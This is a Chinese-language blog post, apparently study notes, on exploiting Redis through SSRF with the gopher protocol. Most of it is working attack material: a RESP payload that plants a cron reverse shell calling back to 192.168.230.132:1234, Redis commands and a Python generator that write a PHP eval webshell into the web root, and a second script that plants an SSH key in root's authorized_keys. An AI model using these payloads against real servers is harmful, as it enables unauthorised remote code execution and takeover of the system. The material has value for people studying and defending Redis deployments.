---
title: "浅谈Redis与SSRF"
date: 2023-06-19
categories: 
  - "web"
tags: 
  - "web"
---

## 什么是Redis？

Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库。

## RESP协议

RESP 协议是 redis 服务之间数据传输的通信协议，redis 客户端和 redis 服务端之间通信会采取 RESP 协议  
因此我们后续构造 payload 时也需要转换成 RESP 协议的格式。

RESP在Redis中用作请求 - 响应协议的方式如下：

1. 客户端将命令作为`Bulk Strings`的RESP数组发送到Redis服务器。

3. 服务器根据命令实现回复一种RESP类型。

RESP协议的格式如下：

```
*1
$8
flushall
*3
$3
set
$1
1
$64

*/1 * * * * bash -i >& /dev/tcp/192.168.230.132/1234 0>&1

*4
$6
config
$3
set
$3
dir
$16
/var/spool/cron/
*4
$6
config
$3
set
$10
dbfilename
$4
root
*1
$4
save
quit
```

- \*n 代表了一条命令的开始，n表示该条命令由n个字符串组成

- $n 表示了该字符串由n个字符组成

## gopher协议

当探测内网或执行命令时需要发送 **POST 请求**，我们可以利用 gopher 协议

协议格式

```
gopher://<host>:<port>/<gopher-path>
```

这里的gopher-path就是相当于要发送的数据包，也就是我们要构造的RESP协议

注意：gopher协议使用时，会吞噬掉gopher-path的第一个字符，通常用个下划线来填充这个字符

## 绝对路径写入webshell

应用条件：

- redis有root权限

- 知道网站的绝对路径

首先要构造redis命令

```
flushall   //用于清空整个redis服务器的所有数据（删除所有数据库的所有 key ）
set 1 '<?php eval($_GET["cmd"]);?>'   //设立一个键值对
config set dir /var/www/html    //指定本地数据库存放目录
config set dbfilename shell.php   //指定本地数据库文件名，默认值为 dump.rdb
save   
```

我们要将这条命令转化为RESP协议的格式再结合gopher协议达到写入shell的目的

贴一个转换脚本：

```
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"  # 使用的协议 
ip=""
port=""   # 目标redis的端口号 
shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
filename="shell.php"   # shell的名字 
path="/var/www/html"      # 写入的路径
passwd=""   # 如果有密码 则填入
# 我们的恶意命令 
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
    print urllib.quote("二次url编码后的结果:\n" + payload)
```

用这个脚本生成的话应该在最后加一个%0A作为语句的截断，不然就无法执行命令。

## Redis写入ssh公钥

条件：redis有root权限

原理：通过在目标机器上写入 ssh 公钥，然后便可以通过 ssh 免密码登录目标机器

首先要生成 ssh 公/私钥

执行这段命令

```
ssh-keygen -t rsa
```

会在 /root/.ssh/目录下生成ssh 公/私钥

我们想要构造的payload：

```
flushall
set 1 'id_rsa.pub 里的内容'
config set dir '/root/.ssh/'
config set dbfilename authorized_keys
save
```

利用以下脚本将payload转化为RESP的格式：

```
import urllib
protocol="gopher://"
ip=""
port=""
sshpublic_key = "\n\nid_rsa.pub 里的内容\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
     "set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
    print urllib.quote("二次url编码后的结果:\n" + payload)
```

配合gopher访问一下，此时要注意靶机的ssh服务一定要是开启的状态。

写入就可以通过ssh连接靶机获得shell权限

### ssh公钥和私钥

如果要使用 **ssh 连接服务，首先我们需要生成私钥和公钥**，私钥留在本地，公钥上传到服务器，这样在连接时，才可以做认证服务。 初始时，对于 linux 系统上的每一个用户，对应的 home 目录下都有一个 .ssh 隐藏目录 ，就是用来存放生成的秘钥和私钥的 如果成功的话，之后连接，就不必使用密码方式。

**_参考链接_**

- [SSRF + Redis 利用方式学习笔记 - 1ndex- - 博客园 (cnblogs.com)](https://www.cnblogs.com/wjrblogs/p/14456190.html)

- [浅析Redis中SSRF的利用 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5665#toc-17)
